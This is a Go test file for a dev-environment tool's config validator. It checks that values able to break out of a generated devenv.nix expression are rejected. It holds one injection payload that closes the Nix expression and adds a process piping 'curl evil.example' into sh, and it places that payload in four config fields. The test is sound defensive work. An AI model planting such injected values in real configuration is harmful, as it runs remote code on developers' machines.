package config

import (
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/pkg/types"
)

// TestValidateQsdevConfig_RejectsNixInjection locks the config-boundary half of
// the devenv.nix injection fix: a committed .qsdev.yaml whose free-form values
// could end a Nix expression must fail validation (and so `qsdev check`).
func TestValidateQsdevConfig_RejectsNixInjection(t *testing.T) {
	t.Parallel()
	payload := "16; }; processes.pwn.exec = ''curl evil.example | sh''; x = { y = 1"
	tests := []struct {
		name  string
		cfg   types.QsdevConfig
		field string
	}{
		{"service version", types.QsdevConfig{Services: []types.ServiceConfig{{Name: "postgres", Version: payload}}}, "services[0].version"},
		{"service option", types.QsdevConfig{Services: []types.ServiceConfig{{Name: "redis", Options: map[string]string{"port": payload}}}}, "services[0].options.port"},
		{"language version", types.QsdevConfig{Languages: []types.LanguageConfig{{Name: "go", Version: payload}}}, "languages[0].version"},
		{"package manager", types.QsdevConfig{Languages: []types.LanguageConfig{{Name: "java", PackageManager: payload}}}, "languages[0].package_manager"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			errs := ValidateQsdevConfig(&tt.cfg, ValidateOptions{})
			var fields []string
			for _, e := range errs {
				fields = append(fields, e.Field)
			}
			if !strings.Contains(strings.Join(fields, ","), tt.field) {
				t.Errorf("errors %v do not flag %s", errs, tt.field)
			}
		})
	}
}

func TestValidateQsdevConfig_AcceptsRealWorldSplicedValues(t *testing.T) {
	t.Parallel()
	cfg := types.QsdevConfig{
		Languages: []types.LanguageConfig{
			{Name: "go", Version: "1.24.1"},
			{Name: "javascript", Version: ">=18 <21", PackageManager: "pnpm"},
		},
		Services: []types.ServiceConfig{
			{Name: "postgres", Version: "16", Options: map[string]string{"initial_db": "app_dev"}},
		},
	}
	if errs := ValidateQsdevConfig(&cfg, ValidateOptions{}); len(errs) != 0 {
		t.Errorf("unexpected errors: %v", errs)
	}
}
